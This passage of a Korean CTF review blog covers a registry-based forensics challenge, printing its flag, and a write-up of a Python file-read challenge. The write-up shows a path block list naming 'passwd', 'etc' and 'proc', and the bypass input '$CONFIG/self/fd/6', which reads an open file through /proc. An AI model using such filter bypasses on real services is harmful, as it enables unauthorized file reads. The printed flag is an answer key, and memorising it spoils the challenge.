&lt;p&gt;Notepad&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xB54C;&amp;#xB9C8;&amp;#xB2E4; &amp;#xC774;&amp;#xC0C1;&amp;#xD55C; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xAC19;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB41C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD558;&amp;#xB294;&amp;#xB370;, &amp;#xC774;&amp;#xAC83;&amp;#xC774; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; fragment&amp;#xC778; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4; &amp;#xC911; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; &amp;#xC2E4;&amp;#xD589; &amp;#xC635;&amp;#xC158; &amp;#xAD00;&amp;#xB828;  &lt;code&gt;Image File Execution Options&lt;/code&gt;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%207.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xC5D0; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; fragment&amp;#xAC00; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs mathematica&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;Image&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;File&lt;/span&gt; Execution &lt;span class=&#34;hljs-keyword&#34;&gt;Options&lt;/span&gt;
&amp;#xD574;&amp;#xB2F9; &amp;#xC11C;&amp;#xBE0C; &amp;#xD0A4;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD589;&amp;#xAC00;&amp;#xB2A5; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0; &amp;#xBC0F; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC; &amp;#xC2DC;, Debugger &amp;#xAC12;&amp;#xC744; &amp;#xCC38;&amp;#xC870;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0;&amp;#xB97C; &amp;#xBA3C;&amp;#xC800; &amp;#xC2E4;&amp;#xD589;.
&amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB098; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xAC80;&amp;#xC99D;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB85C; &amp;#xC545;&amp;#xC6A9;&amp;#xB418;&amp;#xAE30;&amp;#xB3C4; &amp;#xD568;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;base64 &amp;#xC778;&amp;#xCF54;&amp;#xB529; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xB514;&amp;#xCF54;&amp;#xB529;&amp;#xD574;&amp;#xC8FC;&amp;#xBA74; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; fragment&amp;#xAC00; &amp;#xB098;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;4 : 0d1e872378&lt;/p&gt;
&lt;p&gt;1~4&amp;#xC758; Fragment &amp;#xC774;&amp;#xC5B4;&amp;#xBD99;&amp;#xC774;&amp;#xBA74; Flag&amp;#xB97C; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;HCAMP&lt;/span&gt;{&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;cf&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;fb&lt;span class=&#34;hljs-number&#34;&gt;716&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;032&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;79&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;872378&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1 solve&amp;#xB85C; &amp;#xB05D;&amp;#xB09C; &amp;#xBB38;&amp;#xC81C;&amp;#xB77C;&amp;#xC11C; CTF &amp;#xC885;&amp;#xB8CC; &amp;#xD6C4; &amp;#xAC04;&amp;#xB2E8;&amp;#xD558;&amp;#xAC8C; &amp;#xD480;&amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xBC1C;&amp;#xD45C;&amp;#xD558;&amp;#xAE30;&amp;#xB3C4; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC26C;&amp;#xC6B4; &amp;#xD3B8;&amp;#xC5D0; &amp;#xC18D;&amp;#xD558;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xC600;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;del&gt;Windows Heap &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xB4E4;&amp;#xC464;&amp;#xC2E0; &amp;#xAE30;&amp;#xC5B5;&amp;#xC774; &amp;#xC0C8;&amp;#xB85D;&amp;#xC0C8;&amp;#xB85D;&lt;/del&gt; &lt;/p&gt;
&lt;p&gt;CTF&amp;#xAC00; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC774;&amp;#xB77C; &amp;#xAC71;&amp;#xC815;&amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xC88B;&amp;#xC740; &amp;#xD300;&amp;#xC6D0;&amp;#xBD84;&amp;#xB4E4;&amp;#xC744; &amp;#xB9CC;&amp;#xB098; 1&amp;#xB4F1;&amp;#xAE4C;&amp;#xC9C0; &amp;#xD588;&amp;#xB124;&amp;#xC694;. &amp;#xC800;&amp;#xB3C4; 1&amp;#xC778;&amp;#xBD84;&amp;#xC740; &amp;#xD574;&amp;#xC11C; &amp;#xB2E4;&amp;#xD589;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E; &lt;/p&gt;
&lt;h2 id=&#34;README-syru&#34;&gt;&lt;a href=&#34;#README-syru&#34; class=&#34;headerlink&#34; title=&#34;README - syru&#34;&gt;&lt;/a&gt;&lt;strong&gt;README - syru&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;python&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xC778; &lt;code&gt;expandvars&lt;/code&gt;&amp;#xC640; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC758; proc file system&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB38;&amp;#xC81C; &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xAD6C;&amp;#xCD95;&amp;#xD558;&amp;#xB294; &amp;#xB370; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC81C;&amp;#xACF5;&amp;#xB418;&amp;#xC5B4; &amp;#xB354; &amp;#xC218;&amp;#xC6D4;&amp;#xD558;&amp;#xAC8C; &amp;#xD480; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC6B0;&amp;#xC120; &amp;#xC544;&amp;#xB798; Dockerfile&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;/flag&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xBAA8;&amp;#xB450;&amp;#xAC00; &amp;#xC77D;&amp;#xAE30; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB85C; flag &amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;CONFIG=/proc&lt;/code&gt;&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xAC00; &amp;#xB4F1;&amp;#xB85D;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &amp;#xC810;&amp;#xC744; &amp;#xB208;&amp;#xC5EC;&amp;#xACA8; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs shell&#34;&gt;FROM python:3.10-slim-buster

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &amp;amp;&amp;amp; apt-get install -yqq socat
RUN groupadd -r ctf &amp;amp;&amp;amp; useradd -r -g ctf ctf

RUN echo &amp;quot;flag{fake}&amp;quot; &amp;gt; /flag
RUN chmod 444 /flag

USER ctf
WORKDIR /app
ADD server.py .

ENV CONFIG=&amp;quot;/proc&amp;quot;

CMD socat TCP-L:9999,fork,reuseaddr EXEC:&amp;quot;python server.py&amp;quot;,pty,ctty,stderr,echo=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798; server.py&amp;#xB3C4; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC6B0;&amp;#xC120; main&amp;#xC774; &amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; flag &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC5F4;&amp;#xACE0; &lt;strong&gt;&amp;#xB2EB;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC73C;&amp;#xBA70;&lt;/strong&gt; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; &amp;#xC785;&amp;#xB825;&amp;#xC744; &lt;code&gt;filtering&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; &amp;#xD544;&amp;#xD130;&amp;#xB9C1;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4; &lt;code&gt;os.path.expandvars&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCD5C;&amp;#xC885; file path&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; path&amp;#xB97C; &amp;#xC77D;&amp;#xAE30;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C; &amp;#xC5F4;&amp;#xC5B4;&amp;#xC11C; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC744; &amp;#xCD9C;&amp;#xB825;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xB05D;&amp;#xB0A9;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; filtering &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filtering&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;
    FILTER = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;flag&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;etc&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;home&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;~/&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;/~&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;dev&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;proc&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;passwd&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;group&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;run&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;usr&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;var&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;opt&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;..&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./&amp;apos;&lt;/span&gt;]
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; FILTER:
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; filename:
            print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Invalid filename&amp;apos;&lt;/span&gt;)
            sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xBB38;&amp;#xC81C;&amp;#xC758; filtering &amp;#xD568;&amp;#xC218;&amp;#xB294; lib&amp;#xC744; &amp;#xC81C;&amp;#xC678;&amp;#xD55C; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC758; &amp;#xAE30;&amp;#xBCF8; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC;&amp;#xC640; flag &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xD3EC;&amp;#xD568;&amp;#xD558;&amp;#xACE0;&amp;#xB9CC; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;sys.exit(-1)&lt;/code&gt;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xBE44;&amp;#xC815;&amp;#xC0C1; &amp;#xC885;&amp;#xB8CC;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;FILTER&lt;/code&gt; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0; &amp;#xAC78;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC77D;&amp;#xC73C;&amp;#xB824;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xD574;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694;? &lt;/p&gt;
&lt;p&gt;&amp;#xC55E;&amp;#xC11C; Dockerfile&amp;#xC5D0;&amp;#xC11C; &amp;#xBD10;&amp;#xB454; &amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. linux&amp;#xC5D0;&amp;#xC11C; proc file system&amp;#xC740; &amp;#xC6B4;&amp;#xC601;&amp;#xCCB4;&amp;#xC81C;&amp;#xC758; &amp;#xAC01;&amp;#xC885; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xB3C4;&amp;#xC640;&amp;#xC8FC;&amp;#xB294; &amp;#xAC00;&amp;#xC0C1;&amp;#xC758; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB3C;&amp;#xB860; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xB3C4; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xBA70; &amp;#xC774;&amp;#xB294; &lt;code&gt;/proc/{pid}&lt;/code&gt; &amp;#xACBD;&amp;#xB85C;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC800;&amp;#xD76C;&amp;#xAC00; pid&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xB0BC; &amp;#xC218; &amp;#xC5C6;&amp;#xB294;&amp;#xB370; &amp;#xBB34;&amp;#xC791;&amp;#xC815; bruteforce&amp;#xB97C; &amp;#xD574;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694;? &amp;#xBB3C;&amp;#xB860; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xBA87; &amp;#xAC1C; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xB77C; &amp;#xAC00;&amp;#xB2A5;&amp;#xC740; &amp;#xD588;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xB354; &amp;#xD3B8;&amp;#xD558;&amp;#xACE0; &amp;#xD655;&amp;#xC2E4;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xB85C; &amp;#xD604;&amp;#xC7AC; &amp;#xC2E4;&amp;#xD589; &amp;#xC911;&amp;#xC778; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;/proc/self&lt;/code&gt;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xB294; &amp;#xACF3;&amp;#xC740; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xACE0; flag&amp;#xD30C;&amp;#xC77C;&amp;#xC740; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694;? &lt;/p&gt;
&lt;p&gt;&amp;#xC800;&amp;#xD76C;&amp;#xAC00; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xB0B4;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xB54C; &amp;#xC6B4;&amp;#xC601;&amp;#xCCB4;&amp;#xC81C;&amp;#xB294; file descriptor&amp;#xB77C;&amp;#xB294; &amp;#xC815;&amp;#xC218; &amp;#xAC12;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD574;&amp;#xC8FC;&amp;#xACE0; &amp;#xC774; &amp;#xAC12;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; open&amp;#xB4F1;&amp;#xC758; syscall&amp;#xC5D0;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC800;&amp;#xD76C;&amp;#xB294; &lt;code&gt;/proc/{pid}/fd/{fd_value:int}&lt;/code&gt; &amp;#xACBD;&amp;#xB85C;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; python process&amp;#xC5D0;&amp;#xC11C; &amp;#xC5F4;&amp;#xB824;&amp;#xC788;&amp;#xB294; flag&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;flag&amp;#xD30C;&amp;#xC77C;&amp;#xC758; fd&amp;#xAC12;&amp;#xC740; &amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; &amp;#xAC19;&amp;#xC740; &amp;#xD658;&amp;#xACBD;&amp;#xC744; &amp;#xAD6C;&amp;#xC131; &amp;#xD6C4; lsof &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xD574;&amp;#xB2F9; &amp;#xBB38;&amp;#xC81C;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xB9CE;&amp;#xC774; &amp;#xC5F4;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; 2 &amp;#xC774;&amp;#xC0C1;&amp;#xC758; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; bruteforce&amp;#xB97C; &amp;#xD574;&amp;#xB3C4; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;lsof&lt;/code&gt; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xB294; &amp;#xBC95;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; Dockerfile&amp;#xC744; &amp;#xBE4C;&amp;#xB4DC; &amp;#xD6C4; &amp;#xC2E4;&amp;#xD589;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;docker build -t readme-hc .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;docker run -itd -p 9999:9999 readme-hc&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;netcat&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC811;&amp;#xC18D; &amp;#xD6C4; ps, grep&amp;#xC744; &amp;#xD1B5;&amp;#xD574; pid &amp;#xD655;&amp;#xC778;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;ps -ef | grep python&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;lsof -p {pid}&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; /flag&amp;#xC758; fd &amp;#xD655;&amp;#xC778;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/readme1.png&#34; alt=&#34;readm1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xB9C8;&amp;#xBB34;&amp;#xB9AC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/readme2.png&#34; alt=&#34;readme2&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; API &amp;#xBB38;&amp;#xC11C;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;os.path.expandvars&lt;/code&gt;&amp;#xB294; &amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &lt;code&gt;key=value&lt;/code&gt;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;$key/path&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC740; path string&amp;#xC744; &lt;code&gt;value/path&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4;&amp;#xC8FC;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC55E;&amp;#xC11C; Dockerfile&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xB54C; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xB358; &lt;code&gt;CONFIG=/proc&lt;/code&gt;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;$CONFIG/self/fd/6&lt;/code&gt;&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xD558;&amp;#xC5EC; flag&amp;#xB97C; &amp;#xC77D;&amp;#xC73C;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/readme3.png&#34; alt=&#34;readme3&#34;&gt;&lt;/p&gt;
